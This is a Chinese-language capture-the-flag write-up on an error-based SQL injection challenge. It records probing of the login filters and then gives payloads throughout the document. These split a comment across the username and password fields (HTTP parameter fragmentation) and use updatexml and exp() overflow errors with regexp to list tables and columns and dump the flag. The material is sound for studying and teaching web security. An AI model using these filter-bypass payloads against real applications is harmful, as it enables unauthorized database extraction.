@@ -1,0 +1,68 @@
+页面提示我们POSTusername与password两个参数，看了看源码，里面提示了我们sql语句
+
+$sql="select * from users where username='$username' and password='$password'";
+
+先随手post几个数试试，发现页面返回有四种形式，当输入admin，admin时返回Login failed，当输入admin'，admin时发生报错，当输入admin' and '1'='1，admin时出现Sql injection detected，甚至输入()，admin返回了User name unknow error.，这就表明服务器端对输入字符进行了过滤，每当返回Sql injection detected就表明存在被过滤的字符或字符串。
+
+首先手动测一下username过滤了些啥：‘=‘、‘;’、‘#’、‘,’、‘()’、‘-’、union，limit，substr，floor，mid我已经感觉username凉了，()都给滤了还玩个毛线
+
+接着去看看password有没有希望：‘=’、‘;’、‘#’、‘-’、union、limit、substr，mid，floor，ExtractValue，updatexml
+
+大佬还给我留了一个NAME_CONST，但=又被和谐了，这么一来根本没软用，好一道劝退题啊
+
+接下来肯定又是学习没见过的科技的时间了
+
+看了p神的操作，首先是基本操作用or语句报错整出了数据库名：error_based_hpf
+
+通过库名的提示，这里有个hpf，hpf全称为HTTP Parameter Fragment，sql注入里有一种就叫http分割注入
+
+payload：
+
+username=' or updatexml/*&password=*/(1,concat(0x3a,(select user())),1) or '
+
+这里username最后为 /* 而password最前面为*/  在拼接的时候就实现了/* */注释功能
+
+这一题的意思就是在username过滤()，password过滤报错语句，因此我们要在username处使用报错语句，password处使用()
+
+知道原理后开始操作：
+
+知道了库名之后接下来就是拿表，但由于这里和谐了limit，=与like，这里需要用regexp来代替=
+
+payload:
+
+username=' or updatexml/*&password=*/(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables where table_schema regexp database()),0x7e),1) or '
+
+爆字段：
+
+payload：
+
+username=' or updatexml/*&password=*/(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name regexp 'ffll44jj'),0x7e),1) or '
+
+愉悦的去拿flag
+
+payload：
+
+username=' or updatexml/*&password=*/(1,concat(0x7e,(SELECT value FROM ffll44jj),0x7e),1) or '
+
+虽然结果出来了，但想到前面p神还提到另一种思路，由于题目没有过滤regexp，那么这里可以直接在password处采用exp报错
+
+关于exp报错这里给出一个我所参考的链接：使用exp进行SQL报错注入
+
+之前已经知道了数据库名，那么我们直接来报表名：
+
+payload：
+
+username=0&password=' or exp(~(select*from (select group_concat(table_name) from information_schema.tables where table_schema regexp database() )x)) or '1
+
+接着是列
+
+payload：
+
+username=0&password=' or exp(~(select*from (select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj' )x)) or '1
+
+最后来dump数据：
+
+payload：
+
+username=0&password=' or exp(~(select*from (select value from ffll44jj )x)) or '1
+
